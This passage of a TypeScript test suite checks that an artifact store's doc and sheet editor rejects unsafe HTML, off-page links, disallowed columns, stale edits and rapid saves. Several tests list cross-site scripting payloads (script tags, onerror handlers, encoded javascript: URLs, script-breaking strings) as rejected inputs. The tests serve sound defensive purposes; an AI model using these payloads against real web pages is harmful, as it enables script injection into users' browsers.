      const example = /^ {4}<article data-doc>[\s\S]*?^ {4}<\/article>/m.exec(GUIDE_PARTS.doc)?.[0];
      expect(example).toBeDefined();
      pages.writeHtml("budget", { id: "example", kind: "doc", title: "Example", html: example! });
      // And the owner can then edit it, all of it as it was written, and save.
      edit("brief", { doc: `<h1>Plan</h1>${body}<p>Edited</p>` });
      expect(pages.get("brief")?.kind === "html" && (pages.get("brief") as { page: { html: string } }).page.html).toContain("<p>Edited</p>");
      expect(pages.history("brief")).toHaveLength(2);
    });

    it("refuses an edit that carries code, or that does not fit the kind", () => {
      pages.writeHtml("budget", { id: "brief", kind: "doc", title: "Brief", html: doc("<p>x</p>") });
      for (const bad of ["<script>x()</script>", '<img src=x onerror="x()">', "<img/onerror=x() src=x>", '<svg/onload="x()">', '<a href="javascript:x()">a</a>', "</article><script>", "<style>body{}</style>"]) {
        expect(() => edit("brief", { doc: bad })).toThrow(/may not hold/);
      }
      expect(() => edit("brief", { doc: "<iframe></iframe>" })).toThrow(/cannot leave its frame/);
      pages.writeHtml("budget", { id: "app", title: "App", html: "<p>x</p>" });
      expect(() => edit("app", { doc: "<p>y</p>" })).toThrow(/only a doc or a sheet/);
      expect(() => edit("brief", { sheet: book as never })).toThrow(/does not fit/);
      expect(pages.history("brief")).toHaveLength(1);
    });

    /*
     * The dashboard's doc editor saves through this one path, wherever the
     * doc is shown (its project, the Artifacts page, a blob's rail), so the
     * fence is this: the blocks the editor makes are taken, a link off the
     * page is refused, and an edit never moves an artifact or widens what it
     * may reach.
     */
    it("takes the editor's blocks, and keeps an edit to the artifact's own project and declarations", () => {
      pages.writeHtml("budget", { id: "brief", kind: "doc", title: "Brief", html: doc("<p>x</p>") });
      const made =
        '<h2 id="water">Water</h2><p>it is <strong>wet</strong> <code>now</code> <a href="#water">up</a></p><ul class="checklist"><li data-checked="true">Tanks</li></ul>' +
        '<hr><table><thead><tr><th>A</th></tr></thead><tbody><tr><td>1</td></tr></tbody></table><aside class="callout"><p>Note</p></aside>' +
        '<figure><img src="data:image/png;base64,iVBORw0KGgo=" alt="plot"><figcaption>plot</figcaption></figure><blockquote>q</blockquote>';
      const saved = edit("brief", { doc: made });
      expect(saved.projectSlug).toBe("budget");
      const got = pages.get("brief");
      expect(got?.kind === "html" && got.page.html).toContain(made);
      expect(got?.kind === "html" && got.page.capabilities).toBeUndefined();
      // A link off the page has nowhere to go in the frame, so an edit cannot hold one.
      expect(() => edit("brief", { doc: '<p><a href="https://x.example">x</a></p>' })).toThrow(/cannot leave its frame/);
      // A workspace doc stays the workspace's: an edit reaches no project.
      pages.writeHtml(null, { id: "memo", kind: "doc", title: "Memo", html: doc("<p>Note</p>") });
      expect(edit("memo", { doc: "<p>Changed</p>" }).projectSlug).toBeNull();
      expect(pages.list("budget").some((r) => r.id === "memo")).toBe(false);
    });

    it("reads handlers and javascript: inside tags only, refuses links and images that leave the page however written, and caps an edit", () => {
      pages.writeHtml("budget", { id: "brief", kind: "doc", title: "Brief", html: doc("<p>x</p>") });
      // Prose that only mentions them is text.
      edit("brief", { doc: "<p>Set onload = fast, and javascript: the language, in the notes.</p>" });
      for (const bad of ['<a href=""onclick="x()">a</a>', '<p title="x"/onmouseover=x()>a</p>', '<a href="javascript:x()">a</a>', '<img alt=">" src=x onerror="x()">', '<a href="&#106;avascript:x()">a</a>']) {
        expect(() => edit("brief", { doc: bad }), bad).toThrow(/may not hold/);
      }
      for (const leaves of [
        '<a/href="https://x.example">x</a>',
        '<a title="t"href="https://x.example">x</a>',
        '<svg><a xlink:href="https://x.example"><text>x</text></a></svg>',
        '<img src="https://x.example/p.png" alt="">',
        "<img src=//x.example/p.png>",
        '<img srcset="https://x.example/p.png 2x" src="data:image/png;base64,AAAA">',
        '<svg><image href="http://x.example/p.png"/></svg>',
        '<a title=">" href="https://evil.example">x</a>',
        '<a href="&#104;ttps://evil.example">x</a>',
      ]) {
        expect(() => edit("brief", { doc: leaves }), leaves).toThrow(/cannot leave its frame/);
        expect(() => pages.writeHtml("budget", { id: "w", title: "W", html: leaves }), leaves).toThrow(/cannot leave its frame/);
      }
      pages.writeHtml("budget", { id: "pic", title: "Pic", html: '<img src="data:image/png;base64,AAAA" alt="">' });
      expect(() => edit("brief", { doc: `<p>${"x".repeat(DOC_EDIT_MAX)}</p>` })).toThrow(/the most is 300000/);
    });

    it("keeps the owner's edit to a sheet's data as a version, escaped so data cannot end its script", () => {
      pages.writeHtml("budget", { id: "spend", kind: "sheet", title: "Spend", html: sheet(book) });
      const edited = { ...book, sheets: [{ ...book.sheets[0]!, rows: [["Rent", 1250], ["</script><script>alert(1)</script>", 1]] }] };
      edit("spend", { sheet: edited as never });
      const got = pages.get("spend");
      const html = got?.kind === "html" ? got.page.html : "";
      expect(html).not.toContain("</script><script>");
      expect(html.match(/<\/script>/g)).toHaveLength(1);
      expect(JSON.parse(/data-sheet>([\s\S]*)<\/script>/.exec(html)![1]!).sheets[0].rows[1][0]).toBe("</script><script>alert(1)</script>");
      expect(() => edit("spend", { sheet: { sheets: [] } as never })).toThrow(/cannot be saved/);
      const moved = { sheets: [{ name: "T", columns: [{ label: "A", column: "amount" }], source: { table: "budget_tx", key: "id" } }] };
      expect(() => edit("spend", { sheet: moved as never })).toThrow(/which tables/);
    });

    it("lets an edit rename and retype a table's columns as the sheet shows them, never read others", () => {
      const ledger = { sheets: [{ name: "Tx", columns: [{ label: "amount", type: "number" }, { label: "Note", column: "note" }], source: { table: "budget_tx", key: "id" } }] };
      pages.writeHtml("budget", { id: "ledger", kind: "sheet", title: "Ledger", html: sheet(ledger) });
      const shown = { sheets: [{ ...ledger.sheets[0]!, columns: [{ label: "Note", column: "note" }, { label: "Amount (CAD)", column: "amount", type: "currency" }] }] };
      expect(edit("ledger", { sheet: shown as never }).artifactKind).toBe("sheet");
      for (const columns of [[...shown.sheets[0]!.columns, { label: "Secret", column: "secret" }], [shown.sheets[0]!.columns[0]!], [{ label: "Note", column: "note" }, { label: "Amount (CAD)" }]]) {
        expect(() => edit("ledger", { sheet: { sheets: [{ ...shown.sheets[0]!, columns }] } as never }), JSON.stringify(columns)).toThrow(/which columns of its tables/);
      }
    });

    it("refuses an edit made on an older version, an edit that changes nothing, and a second save too soon", () => {
      let clock = 10_000;
      const timed = new PageStore(ws.db, ws, new ProjectManifest(ws.db), () => clock);
      timed.writeHtml("budget", { id: "brief", kind: "doc", title: "Brief", html: doc("<p>One</p>") });
      const opened = timed.get("brief")!.record.updatedAt;
      // KOS rewrites it while the owner has it open.
      clock += 5000;
      timed.writeHtml("budget", { id: "brief", kind: "doc", title: "Brief", html: doc("<p>KOS</p>") });
      clock += 5000;
      expect(() => timed.applyEdit("brief", { doc: "<p>Mine</p>" }, opened)).toThrow(EditConflict);
      expect(() => timed.applyEdit("brief", { doc: "<p>Mine</p>" }, undefined)).toThrow(/which version/);
      const now = timed.get("brief")!.record.updatedAt;
      expect(() => timed.applyEdit("brief", { doc: "<h1>Plan</h1><p>KOS</p>" }, now)).toThrow(/nothing changed/);
      const saved = timed.applyEdit("brief", { doc: "<p>Mine</p>" }, now);
      clock += EDIT_GAP_MS - 1;
      expect(() => timed.applyEdit("brief", { doc: "<p>Again</p>" }, saved.updatedAt)).toThrow(/a moment ago/);
      clock += 1;
      expect(timed.applyEdit("brief", { doc: "<p>Again</p>" }, saved.updatedAt).updatedAt).toBe(clock);
      expect(timed.history("brief")).toHaveLength(4);
    });

    it("removes an artifact with its history and its captures", () => {
      pages.writeHtml(null, { id: "gone", title: "Gone", html: "<p>" });
      const captures = pages.capturesDir("gone");
      mkdirSync(captures, { recursive: true });
      expect(pages.remove("gone")).toBe(true);
      expect(existsSync(captures)).toBe(false);
      expect(existsSync(join(root, "artifacts/.history/gone"))).toBe(false);
    });
  });
});
